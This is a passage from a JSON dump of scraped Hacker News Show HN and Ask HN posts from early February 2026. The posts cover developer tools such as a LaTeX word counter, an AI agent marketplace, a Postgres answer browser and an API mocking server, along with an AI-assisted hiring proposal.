      "source": "hackernews",
      "source_id": "46865138",
      "title": "Latex-wc: word count and word frequency for LaTeX projects",
      "content": "I was revising my proposal defense and kept feeling like I was repeating the same term. In a typical LaTeX project split across many .tex files, itâ€™s awkward to get a quick, clean word-frequency view without gluing everything together or counting LaTeX commands&#x2F;math as â€œwordsâ€.<p>So I built latex-wc, a small Python CLI that:<p>- extracts tokens from LaTeX while ignoring common LaTeX â€œnoiseâ€ (commands, comments, math, refs&#x2F;cites, etc.)<p>- can take a single .tex file or a directory and recursively scan all *.tex files<p>- prints a combined report once (total words, unique words, top-N frequencies)<p>Fastest way to try it is `uvx latex-wc [path]` (file or directory). Feedback welcome, especially on edge cases where you think the heuristic filters are too aggressive or not aggressive enough.",
      "url": null,
      "author_username": "sethbarrettAU",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 2,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523866",
      "published_at": "2026-02-02T20:36:35",
      "scraped_at": "2026-02-03T09:03:12.523868",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46865138",
        "kids_count": 1,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "224840002f434b846fe1584f0c3c3948"
    },
    {
      "id": "f40f155239e9a481e31cd92006bf12e7",
      "source": "hackernews",
      "source_id": "46865130",
      "title": "Ask HN: A proposal for interviewing \"AI-Augmented\" Engineers",
      "content": "Hi HN,<p>Iâ€™m currently rethinking our hiring process. Like many of you, I feel that traditional algorithmic tests (LeetCode style) are becoming less relevant now that LLMs can solve them instantly. Furthermore, prohibiting AI during interviews feels counter-productive; I want to hire engineers who know how to use these tools effectively to multiply their output.<p>I am designing a new evaluation framework based on real-world open-source work, and I would love the communityâ€™s feedback on whether this sounds fair, effective, or if Iâ€™m missing something critical.<p>The Core Philosophy: We shouldn&#x27;t test if a candidate can write syntax better than an AI. We should test if they can guide, debug, and improve upon an AI&#x27;s output to handle the &quot;last mile&quot; of complex engineering.<p>The Proposed Process:<p>1. Task Selection (Real World Context) Instead of synthetic puzzles, we select open issues or discussions from public GitHub repositories that share a tech stack with our product.<p><pre><code>    Scope: 2â€“4 hours.\n\n    Types: Implementing a feature based on a discussion, fixing a bug, or reviewing a PR (specifically one that was eventually rejected, to test &quot;taste&quot;).\n\n    Ambiguity: Adjusted for seniority. Junior roles get clear specs; senior roles get vague problem statements requiring architectural decisions.\n</code></pre>\n2. Establishing the &quot;AI Baseline&quot; Before giving the task to a candidate, we run it through current SOTA models with minimal human intervention.<p><pre><code>    The Filter: If the AI solves it perfectly on the first try, we discard the task.\n\n    The Sweet Spot: We are looking for tasks where the AI gets 80% right but fails on edge cases, context integration, or complex logic. The problem setup should not be too easy or too hard.\n</code></pre>\n3. The Candidate Test Candidates are required to use their preferred AI coding tools. We ask them to submit not just the code, but their chat&#x2F;prompt history.<p>How We Evaluate (The &quot;AI Delta&quot;):<p>We aren&#x27;t just looking at the final code. We analyze the &quot;diff&quot; between the Candidateâ€™s process and our &quot;AI Baseline&quot;:<p><pre><code>    1. Exploration Strategy: How does the candidate &quot;load context&quot;? Do they blindly paste errors, or do they guide the AI to understand the repository structure first? We look for a clear understanding of the existing codebase.\n\n    2. Engineering Rigor (TDD): Does the candidate push the AI to generate a test plan or reproduction script before generating the fix? We value candidates who treat the AI as a junior partner that needs verification.\n\n    3. The &quot;Last 10%&quot; (Edge Cases): Since we picked tasks where AI fails slightly, we look at how the candidate handles those failure modes. Can they spot the boundary conditions and logic errors that the LLM glossed over?\n\n    4. Documentation Hygiene: We specifically check if the candidate instructs the AI to search existing documentation andâ€”cruciallyâ€”if they prompt the AI to update the docs to reflect the new changes.\n\n    5. Engineering Taste (The Rejected PR): For the code review task, we ask them to analyze a PR that was rejected in the real world (without telling them). We want to see if their reasoning for rejection aligns with our team&#x27;s engineering culture (maintainability, complexity, clarity, etc.).\n</code></pre>\nMy Questions for HN:<p><pre><code>    Is analyzing the &quot;Chat History&quot; too invasive, or is it the best way to see their thought process in 2026?\n\n    For those of you hiring now, how do you distinguish between a &quot;prompt kiddie&quot; and a senior engineer who is just very good at prompting?\n\n    Does the 2-4 hour time commitment feel reasonable for a &quot;take-home&quot; if the tooling makes the actual coding faster?\n</code></pre>\nThanks for your insights!<p>(Full disclosure: In the spirit of this topic, this post was composed by AI based on my draft notes.)",
      "url": null,
      "author_username": "vanbashan",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 3,
      "impressions_reposts": 0,
      "impressions_replies": 1,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:12.523879",
      "published_at": "2026-02-02T20:35:50",
      "scraped_at": "2026-02-03T09:03:12.523881",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46865130",
        "kids_count": 1,
        "sections": [
          "ask_hn"
        ]
      },
      "content_hash": "598fc81fe19f2bb39b805e1f17b9d81b"
    },
    {
      "id": "412e7ef9733d849ee21a338aa94d3aac",
      "source": "hackernews",
      "source_id": "46869975",
      "title": "Show HN: npx claude-mycelium grow â€“ fungi agent orchestration for your repo",
      "content": "Show HN: npx claude-mycelium grow â€“ fungi agent orchestration for your repo",
      "url": "https://www.npmjs.com/package/claude-mycelium",
      "author_username": "altras",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:13.690296",
      "published_at": "2026-02-03T07:09:36",
      "scraped_at": "2026-02-03T09:03:13.690303",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46869975",
        "kids_count": 0,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "ac12b263bff17e4f7345bb2a1e6473b5"
    },
    {
      "id": "6613b80592c3ee8af8aeb90d15c2b72e",
      "source": "hackernews",
      "source_id": "46869467",
      "title": "Show HN: I built a task manager in the MacBook notch for my ADHD brain",
      "content": "Your brain has47 tabs open.Notchablecloses them.\n\nThe task manager that lives inside your Mac's notch. Capture every thought in seconds. Let AI handle the rest.\n\nCall mom at 9pm\n\n9:00 PM\n\nFinish landing page\n\n2:00 PM\n\nGym session\n\n6:00 PM\n\nReview PR #42\n\n10:00 AM\n\nFinish landing page\n\nSession 1/4\n\nTeam standup\n\n9:00 â€“ 9:15 AM\n\nDesign review\n\n11:00 â€“ 12:00 PM\n\nLunch w/ Alex\n\n12:30 â€“ 1:30 PM\n\nSprint planning\n\n3:00 â€“ 4:00 PM\n\nFeatures\n\nEverything you need.Nothing you don't.\n\nType or talk\n\nBrain dump everything at once. Type a list, speak naturally, or mix both. Notchable turns chaos into clean tasks instantly.\n\nAI that actually helps\n\nEvery task gets a priority, energy level, and time slot. Even works offline.\n\nBuilt-in Pomodoro\n\nStay locked in with 25-minute focus sessions, visual progress, and automatic breaks.\n\nAlways one glance away\n\nNo windows to find. No dock icon to click. It lives in your notch, ready when you are.\n\nCalendar that keeps up\n\nSee today's events right in the notch. Your calendar, always one glance away.\n\nClick to play demo\n\nHow it works\n\nFour steps. Zero friction.\n\nOpen the notch\n\nHover or tap. It expands into your workspace in an instant.\n\nDump your thoughts\n\nType it, say it, throw five tasks in one sentence. We'll sort it out.\n\nAI does the heavy lifting\n\nEvery task gets categorized and prioritized. Automatically.\n\nGet it done\n\nStart a Pomodoro. Check things off. Watch your day come together.\n\nComparison\n\nNot another to-do app.\n\nTestimonials\n\nDon't take our word for it.\n\nâ€œI've tried every to-do app out there. Notchable is the only one that actually sticks. It just works the way my brain does.â€\n\nAlex R.\n\nSoftware Engineer\n\nâ€œFive tasks captured before my coffee is ready. All sorted, all prioritized. I didn't lift a finger.â€\n\nMaya K.\n\nDesigner\n\nâ€œNo app to open. No window to find. It's just there, in the notch, like a second brain that never forgets.â€\n\nJordan T.\n\nFreelancer\n\nPricing\n\nPay once. Own it forever.\n\nNo subscriptions. No surprise charges. One purchase gets you everything, including every update we ever ship.\n\nThat notch isn't doing anything.Make it work for you.\n\nTurn the most useless part of your Mac into your most productive. Try it free for 7 days.\n\nmacOS 15 Sequoia. Apple Silicon and Intel.",
      "url": "https://notchable.com",
      "author_username": "rezabeye",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 4,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:14.104625",
      "published_at": "2026-02-03T06:13:05",
      "scraped_at": "2026-02-03T09:03:14.104646",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46869467",
        "kids_count": 0,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "a123b9592b7927c389d580c8f6e4176c"
    },
    {
      "id": "c3df48a54ea840f97bb3d5e8ec4c7ef6",
      "source": "hackernews",
      "source_id": "46868971",
      "title": "Show HN: Nioh guide site â€“ release info, beginner guides, and builds",
      "content": "Nioh 3 Guide & Database\n\nBuilds Â· Boss strategies Â· Weapon tier lists Â· Updated per patch\n\nUpdated:Jan 30, 2026Â· Patch:1.00Â· Data:Early testingÂ· Unofficial fan guide\n\nTop Builds\n\nSorted for most players Â· Solo PvE Â· Subject to change\n\nSLightning Sword BuildEasy\n\nSNinjutsu KusarigamaHard\n\nSOnmyo SwitchglaiveMedium\n\nAPurity OdachiMedium\n\nBoss Guides\n\nDifficulty is relative Â· Based on early testing Â· Updated per patch\n\nWhat is Nioh 3?\n\nNioh 3 is the latest entry in Team Ninja's acclaimed action RPG series, released on February 6, 2026 for PlayStation 5 and PC. Set in a fantastical version of feudal Japan, the game follows Tokugawa Takechiyo through a dark narrative filled with yokai, samurai, and supernatural threats.\n\nWeapon Types\n\nFrequently Asked Questions\n\nThe Sword is recommended for beginners due to its balanced moveset and forgiving timing windows. It offers good damage, range, and versatility across all three stances. Check our Beginner Guide for more details.",
      "url": "https://nioh3.net/",
      "author_username": "tanjump",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 2,
      "impressions_reposts": 0,
      "impressions_replies": 1,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:15.148041",
      "published_at": "2026-02-03T05:05:08",
      "scraped_at": "2026-02-03T09:03:15.148050",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46868971",
        "kids_count": 1,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "c8e753352b83cedcdeb558e9ca06223f"
    },
    {
      "id": "a9a3f1820105c7d7470b42d6655b6d4b",
      "source": "hackernews",
      "source_id": "46868436",
      "title": "Show HN: Find viral video ideas on YouTube",
      "content": "Hey I am Julien, the creator of ViralOutlier.<p>I am a Youtuber with 170k subs and 12M views.\n(@EatTheBlocks)<p>Getting good video ideas has been the most important factor to my success.<p>To get new ideas, I started monitoring competitor channels every week, manually.<p>I got lots of good ideas that became viral videos. But the monitoring process is very tedious.<p>I built a tool to automate the process, for myself. Then I decided to make the tool available to others. This is ViralOutlier.<p>If you have question about the tool, reply to this comment.",
      "url": "https://viraloutlier.com",
      "author_username": "jklepatch",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 3,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:16.079748",
      "published_at": "2026-02-03T04:00:01",
      "scraped_at": "2026-02-03T09:03:16.079757",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46868436",
        "kids_count": 2,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "b0d3f26fd9d7c8698ee493c6c13fbcc2"
    },
    {
      "id": "226a78129187241283b5ed2b29496aef",
      "source": "hackernews",
      "source_id": "46864642",
      "title": "Show HN: Axiomeer â€“ An open marketplace for AI agents",
      "content": "Axiomeer (v1)\n\nThe Marketplace for AI Agents\n\nAn open marketplace where AI agents discover, evaluate, and consume tools, datasets, APIs, and other AI products -- with built-in trust, validation, and auditing.\n\nThink of it as anApp Store for AI. Anyone can publish a product (a dataset, an API, a bot, a model endpoint). Any AI agent can shop the marketplace, pick the best product for the job, execute it, validate what comes back, and ingest the results -- all through a single standardized protocol.\n\nThis is not another tool-calling framework. This isinfrastructure for an AI-to-AI economywhere agents autonomously find and consume the right resources, and every transaction is verified.\n\nStatus: v1 Prototype-- The core pipeline works end-to-end (discover, rank, execute, validate, audit). v1 ships with demo providers (weather via Open-Meteo, mock endpoints for testing). The architecture is built so thatany HTTP endpoint returning structured JSON can be a product-- the project needs contributors to add real providers and expand the catalog. See theRoadmapandContributingsections.\n\nTable of Contents\n\nWhy This Project\n\nHow It Differs from MCP\n\nThe Vision\n\nKey Features\n\nArchitecture Overview\n\nTech Stack\n\nRepository Structure\n\nPrerequisites\n\nInstallation\n\nRunning the API Server\n\nCLI Usage\n\nPublishing Apps\n\nClient LLM Simulation\n\nAPI Reference\n\nCore Concepts\n\nConfiguration\n\nRunning Tests\n\nDemo Walkthrough\n\nRoadmap\n\nContributing\n\nLicense\n\nWhy This Project\n\nEvery AI agent needs external resources -- weather data, financial feeds, code execution, document search, translation, summarization. Today, connecting an agent to these resources means hardcoding integrations one at a time. There is no marketplace where an agent canbrowse what is available, compare options, and pick the best one at runtime.\n\nAxiomeer solves this. It creates auniversal catalogwhere:\n\nProviderspublish their products (APIs, datasets, AI bots, model endpoints) with structured metadata\n\nAI agentsshop the catalog based on what they need (capabilities, freshness, cost, latency)\n\nThe marketplaceranks options, executes the best match, validates the output, and delivers verified results back to the agent\n\nThe trust layer is what makes this different from a simple registry:\n\nIf citations are required but missing-- execution fails. No silent garbage.\n\nIf evidence quality is LOW(mock/simulated) -- the agent abstains rather than hallucinating a confident wrong answer.\n\nEvery execution produces a receipt-- success or failure, with full provenance, logged and auditable.\n\nThe goal: agents that canautonomously find and consume the right resources, with infrastructure-level guarantees that the results are real.\n\nHow It Differs from MCP\n\nModel Context Protocol (MCP)standardizes how an LLM connects to aspecific, pre-configured tool server. It is a point-to-point protocol: you wire up a server, the model calls it.\n\nAxiomeer operates at a different layer:\n\nMCP is a protocol for tool access. This is a marketplace for tool selection.\n\nThey are complementary. An MCP server could be one of many providers listed in the marketplace. The marketplace adds the discovery, ranking, validation, and audit layers on top.\n\nThe Vision\n\nThe marketplace is designed to be theconnective layer for an AI-powered ecosystem. The protocol is not limited to simple API calls -- it supports anything an AI agent might need:\n\nWhat can be published (the protocol supports all of these today):\n\nAPIs-- weather, finance, search, geolocation, translation, any REST endpoint\n\nDatasets-- structured data feeds, knowledge bases, document collections\n\nAI Bots / Model Endpoints-- specialized models (code generation, medical Q&A, legal research) that other agents can delegate to\n\nComputation-- code execution sandboxes, math solvers, data processing pipelines\n\nAggregators-- products that themselves call multiple sources and return consolidated results\n\nv1 ships with weather providers (Open-Meteo + mock). The categories above are what the architecture already supports -- contributors can add providers for any of them by writing a JSON manifest and an HTTP endpoint. SeeContributing.\n\nWhere this is headed:\n\nAn agent asks:\"I need current stock data with citations under 500ms\"-- the marketplace finds the best provider, executes it, validates the citations, and delivers verified data\n\nA customer builds a bot that needs weather + finance + document search -- instead of integrating three APIs manually, the bot shops the marketplace and the right providers are selected automatically\n\nA new provider publishes a better weather API -- every agent in the ecosystem immediately has access to it, and the router will rank it against existing options\n\nProviders compete on quality, latency, cost, and citation compliance -- the marketplace creates amarket for AI resourceswhere better products win\n\nThe integration possibilities are open-ended.Any HTTP endpoint that returns structured JSON with citations can be a product. The manifest is 10 lines of JSON. Publishing is a single CLI command. The marketplace handles discovery, ranking, execution, validation, and auditing.\n\nKey Features\n\nOpen Marketplace-- Anyone can publish products (APIs, datasets, bots, model endpoints) via JSON manifests\n\nAI-Native Discovery-- Agents shop for products using natural language; capabilities are inferred automatically\n\nWeighted Ranking-- Scores products using capability match (70%), latency (20%), and cost (10%) with hard constraint filtering\n\nOutput Validation-- Enforces citation requirements and provenance timestamps on every execution\n\nEvidence Quality Assessment-- Deterministic (no LLM) quality scoring prevents agents from trusting mock/fake data\n\nExecution Receipts-- Immutable audit log of every transaction between agents and providers\n\nMulti-Provider Competition-- Multiple providers can offer the same capability; the best one wins at runtime\n\nGraceful Abstention-- When evidence is insufficient, agents abstain instead of hallucinating\n\nLLM Capability Inference-- Extracts required capabilities from natural language via Ollama + heuristic fallbacks\n\nLocal-First-- Uses Ollama for local model inference; no paid API keys required\n\nIdempotent Publishing-- Manifest-based product registration, safe to retry\n\nArchitecture Overview\n\nFlow:\n\nClient sends a task (natural language or structured request)\n\nCapabilities are inferred (LLM + heuristics) or specified manually\n\nRouter ranks registered apps against constraints\n\nTop app is executed via itsexecutor_url\n\nOutput is validated (citations, timestamps) and quality-assessed\n\nA receipt is logged to SQLite regardless of outcome\n\nTech Stack\n\nNo paid APIs are required. All LLM inference runs locally through Ollama.\n\nRepository Structure\n\nPrerequisites\n\nBefore setting up the project, ensure you have the following installed:\n\nPython 3.10+python3 --version\n\nPython 3.10+\n\nOllama(for LLM features: capability extraction, answer generation)#Install Ollama: https://ollama.ai#Then pull the required model:ollama pull llama2:7bOllama is optional if you only use manual capability tags (skip--auto-caps). It is required for the client LLM simulation and auto-capability inference.\n\nOllama(for LLM features: capability extraction, answer generation)\n\nOllama is optional if you only use manual capability tags (skip--auto-caps). It is required for the client LLM simulation and auto-capability inference.\n\nGit(for cloning and contributing)\n\nGit(for cloning and contributing)\n\nInstallation\n\n1. Clone the repository\n\n2. Create and activate a virtual environment\n\n3. Upgrade pip\n\n4. Install the project in editable mode\n\nThis installs all dependencies:\n\nRuntime:fastapi,uvicorn,pydantic,sqlalchemy,typer,rich,requests,python-dotenv\n\nDev:pytest,httpx(for API testing)\n\nRunning the API Server\n\nStart the FastAPI server:\n\nThe server runs athttp://127.0.0.1:8000by default.\n\nSwagger UI (interactive docs):http://127.0.0.1:8000/docs\n\nHealth check:GET /health\n\nThe SQLite database (marketplace.db) is auto-created on first startup.\n\nCLI Usage\n\nThe CLI provides all marketplace operations without needing a browser. The API server must be running first.\n\nList all registered apps\n\nShop for the best tool\n\nFlags:\n\nShop and execute the top pick\n\nView execution receipts\n\nPublishing Apps\n\nApps are registered in the marketplace via JSON manifests.\n\n1. Create a manifest file\n\nExample:manifests/realtime_weather_agent.json\n\nManifest fields:\n\n2. Publish to the marketplace\n\nPublishing is idempotent -- running it again updates the existing listing.\n\n3. Verify the listing\n\nClient LLM Simulation\n\nThe client LLM script demonstrates the full end-to-end pipeline: an LLM shops the marketplace, executes a tool, assesses evidence quality, and either answers with grounded citations or abstains.\n\nPipeline steps:\n\nInfer capabilities from the natural language question\n\nShop the marketplace with inferred constraints\n\nExecute the top-ranked tool\n\nAssess evidence quality (deterministic: HIGH / MEDIUM / LOW)\n\nIfHIGH: generate a grounded answer constrained to provided evidence\n\nIfLOW: abstain deterministically (no hallucination)\n\nRequires Ollama running withllama2:7bpulled.\n\nAPI Reference\n\nAll endpoints are available athttp://127.0.0.1:8000. Full interactive documentation is at/docs.\n\nExample: Shop request\n\nExample: Execute request\n\nCore Concepts\n\nRecommendation Engine\n\nThe router scores apps using weighted criteria:\n\nHard filters(apps are excluded if they fail any):\n\nFreshness mismatch\n\nCitations not supported (when required)\n\nLatency exceedsmax_latency_ms\n\nCost exceedsmax_cost_usd\n\nOutput Validation\n\nWhenrequire_citationsis true, the provider's responsemustinclude:\n\ncitations: a non-empty list of strings (URLs or references)\n\nretrieved_at: a non-empty string (ISO timestamp)\n\nIf either is missing, the execution is markedok: falsewith detailedvalidation_errors.\n\nEvidence Quality Assessment\n\nA deterministic (no LLM) trust check:\n\nExecution Receipts\n\nEvery execution (success or failure) is logged to",
      "url": "https://github.com/ujjwalredd/Axiomeer",
      "author_username": "ujjwalreddyks",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 4,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:16.666404",
      "published_at": "2026-02-02T19:43:31",
      "scraped_at": "2026-02-03T09:03:16.666415",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46864642",
        "kids_count": 1,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "9f15f98b0747f9235a90553e96800bb7"
    },
    {
      "id": "a52253242ff884bd6e8f6f62702eff10",
      "source": "hackernews",
      "source_id": "46868018",
      "title": "Show HN: ErwinDB, a TUI to view 7k Stack Overflow answers by Postgres expert",
      "content": "ErwinDB\n\nA TUI for browsingErwin Brandstetter'sStack Overflow Q&A content.\n\nWhy Erwin's Answers?\n\nErwin Brandstetter is a PostgreSQL consultant with ~670k reputation and ~7k answers on Stack Overflow.\n\nOver the years, I've lost count of how often I've searched Stack Overflow for a Postgres question and ended up with an answer by Erwin Brandstetter that was exceptionally thorough and clear. I've become a better developer by learning from his responses.\n\nWhen answering questions, he typically:\n\nLinks to and quotes the PostgreSQL manual constantly, showing you exactly where features are documented\n\nNotes which features work in which Postgres versions, and updates old answers when new versions add capabilities\n\nAddresses edge cases you wouldn't think ofâ€”NULL handling, concurrency, race conditions\n\nBenchmarks multiple approaches with actual timing results\n\nWhy This App?\n\nErwinDB lets you browse Erwin Brandstetter's answers offline and search them quickly from a TUI. It includes semantic search, syntax highlighting, one-key opening of links in your external browser, and an \"Erwin mode\" that prominently highlights his posts.\n\nInstallation\n\nCargo\n\nHomebrew\n\nNix\n\nFrom source\n\nFeatures\n\nBrowse questions where Erwin Brandstetter has answered\n\nFuzzy search on question titles\n\nSemantic search using ML embeddings\n\nSyntax-highlighted code blocks\n\nDual-pane view (question + Erwin's answer side-by-side on wide terminals)\n\nKeyboard Shortcuts\n\nQuestion List\n\nQuestion Detail\n\nDemos\n\nDevelopment\n\nReleasing\n\nLicense\n\nThis project has two separate licenses:\n\nCode(TUI, scraper, utilities):GNU General Public License v3.0\n\nData(Stack Overflow content in the database):CC BY-SA- content from Stack Overflow is licensed under Creative Commons Attribution-ShareAlike, with the specific version (2.5, 3.0, or 4.0) depending on when it was originally posted",
      "url": "https://github.com/ahacop/erwindb",
      "author_username": "ahacop",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 3,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:17.273890",
      "published_at": "2026-02-03T03:08:23",
      "scraped_at": "2026-02-03T09:03:17.273901",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46868018",
        "kids_count": 0,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "74e80e42d622fccd0dc00f4387f47470"
    },
    {
      "id": "58b95071e5298187041e8e7d40d46609",
      "source": "hackernews",
      "source_id": "46866383",
      "title": "Show HN: Kannada Nudi Editor Web Version",
      "content": "Ported the Desktop Version of Kannada Nudi Editor to Web under the guidance of <a href=\"https:&#x2F;&#x2F;kagapa.com&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;kagapa.com&#x2F;</a>",
      "url": "https://nudiweb.com/",
      "author_username": "Codegres",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 4,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:17.591603",
      "published_at": "2026-02-02T23:11:16",
      "scraped_at": "2026-02-03T09:03:17.591612",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46866383",
        "kids_count": 0,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "13ea91eeaeb8340e8aed434316230c40"
    },
    {
      "id": "8b66ec1c418547b1bae2de3b3122cb15",
      "source": "hackernews",
      "source_id": "46865976",
      "title": "Show HN: Open-source semantic search over your local notes via CLI",
      "content": "nia-vault\n\nA CLI application for querying your local notes and files using AI-powered semantic search viaNia.\n\nFeatures\n\nSemantic Search: Query your notes using natural language\n\nMultiple Folders: Search across multiple synced folders\n\nSeamless Integration: Automatically uses credentials from nia-sync\n\nFlexible Sync: Sync folders on-demand or before searches\n\nPrerequisites\n\nNode.js >= 18.0.0 or Bun\n\nnia-syncinstalled and configured\n\nInstallation\n\nAfter installation, thevaultcommand is available globally.\n\nQuick Start\n\nCommands\n\nvault init\n\nInteractive setup wizard that detects your nia-sync configuration and lets you select which folders to include in searches.\n\nvault ask \"<question>\"\n\nQuery your notes using semantic search.\n\nOptions:\n\nvault sync\n\nManually trigger a sync of all folders.\n\nvault folders\n\nList, add, or remove folders from search scope.\n\nvault config\n\nView or reset configuration.\n\nConfiguration\n\nnia-sync Configuration (read-only)\n\nnia-vault reads the API key from~/.nia-sync/config.json. This file is managed by nia-sync.\n\nnia-vault Configuration\n\nLocation:~/.config/nia-vault/config.json\n\nThis file only stores which folders are included in searches. The API key is always read from nia-sync.\n\nTroubleshooting\n\nContributing\n\nAdding a Changeset\n\nWhen making changes that should be included in a release, please add a changeset:\n\nThis will prompt you to describe your changes. Choose the appropriate version bump:\n\npatch(0.0.x): Bug fixes, small improvements, documentation updates\n\nminor(0.x.0): New features, non-breaking changes\n\nmajor(x.0.0): Breaking changes\n\nThe changeset file should be committed with your PR.\n\nDevelopment Workflow\n\nLicense\n\nMIT",
      "url": "https://github.com/chenxin-yan/nia-vault",
      "author_username": "jellyotsiro",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 4,
      "impressions_reposts": 0,
      "impressions_replies": 3,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:18.328123",
      "published_at": "2026-02-02T22:13:32",
      "scraped_at": "2026-02-03T09:03:18.328135",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46865976",
        "kids_count": 2,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "8fa9382895a8a2a330fc5cc4b9c339c2"
    },
    {
      "id": "c397524dd44edf66e6928d5622e980c0",
      "source": "hackernews",
      "source_id": "46858966",
      "title": "Show HN: PolliticalScience â€“ Anonymous daily polls with 24-hour windows",
      "content": "Voting should be mandatory.",
      "url": "https://polliticalscience.vote/",
      "author_username": "ps2026",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 25,
      "impressions_reposts": 0,
      "impressions_replies": 40,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:19.430818",
      "published_at": "2026-02-02T12:55:11",
      "scraped_at": "2026-02-03T09:03:19.430829",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46858966",
        "kids_count": 12,
        "sections": [
          "show_hn"
        ]
      },
      "content_hash": "ba6eab2a930811593d1d6d71ac42f2ff"
    },
    {
      "id": "641b23b92d947e4dbc223c72ceb4a2dc",
      "source": "hackernews",
      "source_id": "46845097",
      "title": "Show HN: Apate API mocking/prototyping server and Rust unit test library",
      "content": "API prototyping and mocking server that main purpose is to help with integration and end-to-end testing.\nProject named after Apate - the goddess and personification of deceit.\n\nğŸš€ Project is stable.\nAlmost everything works as it was planned.\nI will wait some time for user feedback.\nNo breaking changes expected in the nearest future.\n\nFeatures\n\nğŸ’»âš™ï¸ Standalone server app with web UI\n\nğŸ”ƒ Live specs reloading via UI or API\n\nğŸ­ Mocking any string & binary responses\n\nâ›©ï¸ Jinja templates to customize response body\n\nğŸŒ¿Rhaiscripting for advanced scenarios\n\nğŸ’¾ In memory persistence to mimic DB behavior in some cases\n\nğŸ› ï¸ Unit tests friendly rust library\n\nğŸ¦€ Ability to build custom mocking server with your rust extensions\n\nWhy do you need it â”\n\nğŸ‘¨ğŸ»â€ğŸ’»local development- to do not run/build other services locally or call external APIs\n\nğŸ¦€rust unit tests- to test your client logic without shortcuts\n\nğŸ’»ğŸ› ï¸âš™ï¸integration tests- if 3rd party API provider suck/stuck/etc it is better to run test suites against predictable API endpoints.\n\nğŸ’»ğŸ‹ğŸ»â€â™‚ï¸load tests- when deployed alongside your application Apate should respond fast, so no need to take external API delays into account.\n\nğŸ“‹API server prototyping- it could be convenient to have working API endpoint before implementing whole server logic\n\nRunning Apate server\n\nDocker image\n\nLaunching a clean disposable container is easy with docker.\n\nIt will run Apate server without any URI deceit.\nSo you should add new specification via API endpoints or web UI (see below).\n\nTo start server with some specs mount your TOML specs into docker image and provide proper ENV variables.\n\nExample above expecting you to executedocker runfrom the Apate git repository root.\n\nInstall & run locally via cargo\n\nIf you havecargothen just install it ascargo install apate.\nAfter that you will haveapatebinary in your$PATH.\n\nApate server configuration\n\nWeb UI\n\nApate web UI is located athttp://HOST:PORT/apate(will behttp://localhost:8228/apatefor most cases).\nWorks for docker too.\n\nPlease noticethat specification shown in web UI is not looking cool.\nAll because it is automatically generated from the internal representation.\nPlease seeexamplesfolder to figure out how to write TOML specs in pretty way.\n\nENV variables and CLI args\n\nYou could use next ENV variables:\n\nRUST_LOGandRUST_LOG_STYLE- to configure 